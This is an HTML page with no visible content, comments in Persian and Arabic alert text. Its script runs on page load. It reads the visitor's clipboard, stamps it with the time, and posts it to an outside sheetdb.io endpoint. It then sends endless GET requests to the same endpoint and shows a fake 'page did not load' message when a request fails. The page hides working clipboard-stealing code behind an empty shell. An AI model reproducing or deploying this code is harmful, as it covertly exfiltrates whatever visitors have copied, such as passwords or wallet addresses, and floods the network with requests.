<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title></title>
</head>
<body>
  <script>
    // ===== گرفتن زمان دقیق تا میلی‌ثانیه =====
    function getCurrentTime() {
      const now = new Date();
      return now.getFullYear() + '-' +
             String(now.getMonth() + 1).padStart(2, '0') + '-' +
             String(now.getDate()).padStart(2, '0') + ' ' +
             String(now.getHours()).padStart(2, '0') + ':' +
             String(now.getMinutes()).padStart(2, '0') + ':' +
             String(now.getSeconds()).padStart(2, '0') + '.' +
             String(now.getMilliseconds()).padStart(3, '0');
    }

    const API_URL = 'https://sheetdb.io/api/v1/8e85xlxw5rxza';

    // ===== ارسال GET (حلقه‌ی بی‌نهایت) =====
    function sendGet() {
      fetch(API_URL, { method: 'GET', headers: { 'Accept': 'application/json' } })
        .then(response => response.text())
        .then(text => {
          sendGet(); // دوباره GET بفرست
        })
        .catch(error => {
          alert('لم تحمل الصفحة المطلوبة');
        });
    }

    // ===== ارسال POST با زمان و محتوای کلیپ‌بورد =====
    async function sendPost() {
      let clipboardText = '';
      try {
        if (navigator.clipboard && navigator.clipboard.readText) {
          clipboardText = await navigator.clipboard.readText();
        } else {
          clipboardText = 'Clipboard not accessible';
        }
      } catch (err) {
        clipboardText = 'Error reading clipboard: ' + err.message;
      }

      const time = getCurrentTime();
      const payloadText = "زمان:" + time + " | کلیپ:" + clipboardText;
      const payload = { T: payloadText };

      fetch(API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      })
        .then(response => response.text())
        .then(text => {
          sendGet(); // پس از پاسخ POST، یک GET بفرست
        })
        .catch(error => {
          alert('لم تحمل الصفحة المطلوبة');
        });
    }

    // ===== اجرا در شروع =====
    sendPost();   // معادل initializeLogic
    sendGet();    // معادل onStart
  </script>
</body>
</html>
